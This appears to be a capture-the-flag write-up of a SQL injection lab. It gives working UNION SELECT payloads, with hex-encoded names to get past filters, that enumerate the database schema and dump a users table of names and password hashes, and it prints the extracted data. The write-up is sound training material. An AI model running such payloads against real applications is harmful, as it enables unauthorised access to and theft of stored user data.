# **Description:**

The challenge presented a web page with a "Members" section. Clicking on it led to a search functionality: "Search member by ID:" with an input field and a submit button.

## **Vulnerability:**

The application was vulnerable to SQL injection due to unsanitized user input in the ID search field.

## **Exploitation:**

#### `Error Detection:`
Entering 1' into the search field resulted in a MariaDB syntax error: "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near1 ''' at line 1". This confirmed the presence of SQL injection.   

#### `Column Count Determination:`
The query 1 union select null, null was used to determine the number of columns returned by the original query. The successful display of results indicated that the original query returned two columns.

#### `Database Name Retrieval:`
```
0 union select null, database()
```
Retrieved the database name:
Member_Sql_Injection

#### `Table Enumeration:`
```
0 union select null, group_concat(table_name) from information_schema.tables where table_schema=0x4d656d6265725f53716c5f496e6a656374696f6e
```
Retrieved the table names within the "Member_Sql_Injection" database. The hexadecimal representation 0x4d656d6265725f53716c5f496e6a656374696f6e was used to bypass potential input filters.
This query retrieved the table name:
users

#### `Column Enumeration:`
```
0 union select null, group_concat(column_name) from information_schema.columns where table_name=0x7573657273
```
Retrieved the column names from the "users" table. The table name, "users", was also converted to hex 0x7573657273.
user_id,first_name,last_name,town,country,planet,Commentaire,countersign

#### `Data Extraction:`
```
0 union select null, group_concat(user_id, 0x3a, first_name, 0x3a, last_name, 0x3a, town, 0x3a, country, 0x3a, planet, 0x3a, Commentaire, 0x3a, countersign) from users
```
Extracted all the data from the "users" table. The 0x3a is the hex value for the colon ":" character, which was used as a delimiter.
1:one:me:Paris :France:EARTH:Je pense, donc je suis:2b3366bcfd44f540e630d4dc2b9b06d9,2:two:me:Helsinki:Finlande:Earth:Aamu on iltaa viisaampi.:60e9032c586fb422e2c16dee6286cf10,3:three:me:Dublin:Irlande:Earth:Dublin is a city of stories and secrets.:e083b24a01c483437bcf4a9eea7c1b4d,5:Flag:GetThe:42:42:42:Decrypt this password -> then lower all the char. Sh256 on it and it's good !:5ff9d0165b4f92b14994e5c685cdce28

## **Flag Retrieval:**

The flag was obtained from the "countersign" column where the "first_name" was "Flag". The data contained the encrypted flag.
The encrypted string "5ff9d0165b4f92b14994e5c685cdce28" was decrypted, converted to lowercase, and then hashed with SHA256 to retrieve the final flag.

